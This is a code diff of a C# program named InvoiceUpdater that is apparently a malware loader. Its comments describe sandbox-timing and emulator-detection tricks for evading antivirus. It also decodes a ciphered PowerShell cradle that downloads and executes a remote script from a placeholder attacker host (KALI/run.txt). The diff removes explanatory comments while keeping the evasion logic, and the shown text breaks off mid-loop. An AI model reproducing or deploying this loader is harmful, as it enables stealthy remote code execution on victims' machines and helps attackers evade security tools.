@@ -8,7 +8,7 @@
 //   2. Non-emulated API check — VirtualAllocExNuma returns null in AV emulators
 //   3. Caesar-ciphered cradle string — no static signature in the binary
 //
-// The base64 cradle decodes to:
+// Base64 cradle decodes to:
 //   iex((new-object system.net.webclient).downloadstring('http://KALI/run.txt'))
 
 using System;
@@ -20,7 +20,6 @@ namespace InvoiceUpdater
 {
     class Program
     {
-        // --- Win32 imports for emulator detection ---
         [DllImport("kernel32.dll")]
         static extern void Sleep(uint dwMilliseconds);
 
@@ -31,31 +30,26 @@ namespace InvoiceUpdater
         [DllImport("kernel32.dll")]
         static extern IntPtr GetCurrentProcess();
 
-        // Ciphered base64 cradle. Each byte XOR 0x5A (arbitrary key).
         // Regenerate with:
-        //   $cmd = "iex((new-object system.net.webclient)" +
-        //          ".downloadstring('http://KALI_IP/run.txt'))"
-        //   $b64 = [Convert]::ToBase64String([Text.Encoding]::Unicode.GetBytes($cmd))
-        //   # then XOR each character code with 0x5A and dump as byte array
+        //   python3 tools/encode_cradle.py
         static byte[] ciphered = new byte[] {
-            // placeholder — replace with your ciphered cradle
             0x00,0x00,0x00
         };
 
         static void Main()
         {
-            // ── Layer 1: emulator detection ─────────────────────────────────
+            // Layer 1: emulator detection
             DateTime t1 = DateTime.Now;
             Sleep(2000);
             double delta = DateTime.Now.Subtract(t1).TotalSeconds;
-            if (delta < 1.5) return;   // sandbox fast-forwarded the Sleep
+            if (delta < 1.5) return;
 
-            // ── Layer 2: non-emulated API check ────────────────────────────
+            // Layer 2: non-emulated API check
             IntPtr mem = VirtualAllocExNuma(GetCurrentProcess(), IntPtr.Zero,
                 0x1000, 0x3000, 0x04, 0);
-            if (mem == IntPtr.Zero) return;  // AV emulator doesn't implement this API
+            if (mem == IntPtr.Zero) return;
 
-            // ── Layer 3: decrypt cradle and run ────────────────────────────
+            // Layer 3: decrypt cradle and run
             StringBuilder sb = new StringBuilder(ciphered.Length);
             for (int i = 0; i < ciphered.Length; i++)
             {
